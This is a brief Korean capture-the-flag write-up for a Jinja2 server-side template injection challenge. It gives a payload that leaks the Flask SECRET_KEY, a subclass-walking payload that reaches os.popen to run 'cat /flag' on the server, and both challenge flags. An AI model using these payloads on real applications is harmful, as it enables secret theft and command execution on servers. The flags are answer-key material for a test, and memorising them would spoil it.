# 라업
flag가 두 개인데, 아래의 페이로드를 각각 입력하면 flag를 얻을 수 있음
1. app.secret_key flag
```
{{config['SECRET_KEY']}}
```


2. server flag 
- SSTI + RCE
- [참고](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat /flag").read()}}{%endif%}{% endfor %}
```

# 플래그
KO{J1nj42_1s_n0t_s4f3~}
K0{sst1_m4k3_m3_cr4zzzy}

# 설명
ssti 취약점을 통한 어플리케이션 레벨의 데이터 탈취 및 RCE